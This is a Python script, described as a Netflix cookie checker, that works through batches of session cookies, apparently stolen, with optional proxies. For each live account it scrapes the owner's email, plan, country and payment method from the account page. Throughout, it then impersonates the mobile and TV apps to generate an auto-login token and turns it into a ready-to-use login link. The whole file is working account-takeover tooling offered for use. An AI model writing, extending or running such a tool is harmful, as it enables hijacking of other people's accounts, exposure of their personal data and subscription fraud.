"""
Netflix Cookie Checker - Ported from Work.py
Checks Netflix cookies for membership status, plan, payment, auto-login token.
"""

import json
import re
import time
import asyncio
import aiohttp
import urllib.parse
from datetime import datetime
from typing import Dict, Optional, Tuple


COUNTRY_MAP = {
    'US': 'United States 🇺🇸', 'GB': 'United Kingdom 🇬🇧', 'IN': 'India 🇮🇳',
    'CA': 'Canada 🇨🇦', 'AU': 'Australia 🇦🇺', 'DE': 'Germany 🇩🇪',
    'FR': 'France 🇫🇷', 'ES': 'Spain 🇪🇸', 'IT': 'Italy 🇮🇹',
    'BR': 'Brazil 🇧🇷', 'MX': 'Mexico 🇲🇽', 'JP': 'Japan 🇯🇵',
    'KR': 'South Korea 🇰🇷', 'NL': 'Netherlands 🇳🇱', 'SE': 'Sweden 🇸🇪',
    'NO': 'Norway 🇳🇴', 'DK': 'Denmark 🇩🇰', 'FI': 'Finland 🇫🇮',
    'PL': 'Poland 🇵🇱', 'TR': 'Turkey 🇹🇷', 'SA': 'Saudi Arabia 🇸🇦',
    'AE': 'UAE 🇦🇪', 'EG': 'Egypt 🇪🇬', 'ZA': 'South Africa 🇿🇦',
    'AR': 'Argentina 🇦🇷', 'CL': 'Chile 🇨🇱', 'CO': 'Colombia 🇨🇴',
}

TOKEN_ENDPOINTS = [
    {
        'name': 'Android',
        'url': 'https://android13.prod.ftl.netflix.com/graphql',
        'headers': {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/'
        }
    },
    {
        'name': 'iOS',
        'url': 'https://ios.prod.ftl.netflix.com/graphql',
        'headers': {
            'User-Agent': 'com.netflix.mediaclient/14.3.0 (iOS; U; CPU iPhone OS 15_0 like Mac OS X)',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json'
        }
    },
    {
        'name': 'TV',
        'url': 'https://nrdp.prod.ftl.netflix.com/graphql',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SmartTV Safari/537.36',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json'
        }
    }
]

TOKEN_PAYLOAD = {
    "operationName": "CreateAutoLoginToken",
    "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
    "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}
}


# ==================== COOKIE PARSER ====================

def parse_cookies(cookie_content: str) -> Dict[str, str]:
    """Universal cookie parser — handles JSON array, JSON dict, Netscape, header string, key=value lines."""
    if not cookie_content:
        return {}

    # Try JSON
    try:
        data = json.loads(cookie_content)
        if isinstance(data, dict):
            return data
        if isinstance(data, list):
            result = {}
            for item in data:
                if isinstance(item, dict):
                    name = item.get('name') or item.get('Name')
                    value = item.get('value') or item.get('Value')
                    if name and value:
                        result[name] = value
            return result
    except:
        pass

    # Netscape format (tab-separated)
    if '\t' in cookie_content or cookie_content.startswith('#'):
        cookies = {}
        for line in cookie_content.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            parts = line.split('\t')
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
            elif len(parts) == 2:
                cookies[parts[0]] = parts[1]
        return cookies

    # Header string (semicolon-separated)
    if ';' in cookie_content:
        cookies = {}
        for pair in cookie_content.split(';'):
            if '=' in pair:
                name, val = pair.split('=', 1)
                cookies[name.strip()] = val.strip().strip('"')
        return cookies

    # key=value lines
    cookies = {}
    for line in cookie_content.split('\n'):
        if '=' in line and not line.startswith('http'):
            name, val = line.split('=', 1)
            cookies[name.strip()] = val.strip()
    return cookies


# ==================== ASYNC REQUEST HELPER ====================

async def make_request(session, method, url, headers=None, data=None, json_data=None,
                       cookies=None, proxy=None, timeout=30):
    try:
        proxy_str = str(proxy) if proxy else None
        async with session.request(method, url, headers=headers, data=data, json=json_data,
                                   cookies=cookies, proxy=proxy_str,
                                   timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
            text = await resp.text()
            return text, resp.status
    except Exception as e:
        return None, None


# ==================== AUTO-LOGIN TOKEN ====================

async def generate_auto_login_token(session, cookies, proxy=None) -> Tuple[Optional[str], Optional[str]]:
    nfid = cookies.get("NetflixId")
    snfid = cookies.get("SecureNetflixId")
    if not nfid:
        return None, None

    cookie_parts = [f"NetflixId={nfid}", f"SecureNetflixId={snfid}"]
    if "nfvdid" in cookies:
        cookie_parts.append(f"nfvdid={cookies['nfvdid']}")
    cookie_str = "; ".join(cookie_parts)

    for ep in TOKEN_ENDPOINTS:
        headers = ep['headers'].copy()
        headers['Cookie'] = cookie_str
        try:
            text, status = await make_request(session, 'POST', ep['url'],
                                              headers=headers, json_data=TOKEN_PAYLOAD,
                                              proxy=proxy, timeout=20)
            if status == 200 and text:
                data = json.loads(text)
                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                    token = data['data']['createAutoLoginToken']
                    return token, ep['name']
        except:
            continue
    return None, None


# ==================== MAIN CHECK ====================

async def check_netflix_cookie(cookie_content: str, proxy=None) -> dict:
    """
    Check a single Netflix cookie. Returns a result dict with status, email, plan, etc.
    """
    cookies = parse_cookies(cookie_content)

    result = {
        'status': 'Failed',
        'email': 'N/A',
        'plan': 'N/A',
        'country': 'N/A',
        'payment_method': 'N/A',
        'extra_member': False,
        'video_quality': 'N/A',
        'max_streams': 0,
        'auto_login_link': None,
        'token_endpoint': None,
        'error': None,
    }

    if not cookies:
        result['error'] = 'No cookies parsed'
        return result

    async with aiohttp.ClientSession() as session:
        url = "https://www.netflix.com/account/membership"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html'
        }
        text, status = await make_request(session, 'GET', url, headers=headers,
                                          cookies=cookies, proxy=proxy)
        if status != 200:
            result['error'] = f'HTTP {status}'
            return result

        if 'CURRENT_MEMBER":true' in text:
            result['status'] = 'Hit'
        elif 'NEVER_MEMBER":true' in text:
            result['status'] = 'Never Member'
            return result
        else:
            result['error'] = 'Not logged in or expired'
            return result

        # Email
        email_match = re.search(
            r'"email":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"', text)
        if email_match:
            result['email'] = email_match.group(1).replace('\\x40', '@')

        # Plan
        plan_match = re.search(
            r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
        if plan_match:
            result['plan'] = plan_match.group(1).replace('\\', '')

        # Country
        code_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if code_match:
            code = code_match.group(1)
            result['country'] = COUNTRY_MAP.get(code, code)

        # Payment method
        pm_match = re.search(
            r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"', text)
        if pm_match:
            result['payment_method'] = pm_match.group(1)

        # Extra member
        if '"showExtraMemberSection":{"fieldType":"Boolean","value":true' in text:
            result['extra_member'] = True

        # Video quality
        vq_match = re.search(
            r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"', text)
        if vq_match:
            result['video_quality'] = vq_match.group(1)

        # Max streams
        ms_match = re.search(
            r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)', text)
        if ms_match:
            result['max_streams'] = int(ms_match.group(1))

        # Auto-login token
        if result['status'] == 'Hit':
            token, endpoint = await generate_auto_login_token(session, cookies, proxy)
            if token:
                result['auto_login_link'] = f"https://netflix.com/?nftoken={token}"
                result['token_endpoint'] = endpoint

    return result


# ==================== BATCH CHECK ====================

async def check_netflix_cookies(cookie_contents: list, max_concurrent: int = 5,
                                on_progress=None, stop_event=None) -> list:
    """
    Check multiple Netflix cookies concurrently.
    cookie_contents: list of (filename, cookie_text) tuples
    Returns list of result dicts.
    """
    semaphore = asyncio.Semaphore(max_concurrent)
    results = []
    done_count = 0
    total = len(cookie_contents)

    async def check_one(filename, cookie_text):
        nonlocal done_count
        if stop_event and stop_event.is_set():
            return
        async with semaphore:
            if stop_event and stop_event.is_set():
                return
            r = await check_netflix_cookie(cookie_text)
            r['filename'] = filename
            results.append(r)
            done_count += 1
            if on_progress:
                on_progress(done_count, total)

    tasks = [check_one(fn, ct) for fn, ct in cookie_contents]
    await asyncio.gather(*tasks)
    return results
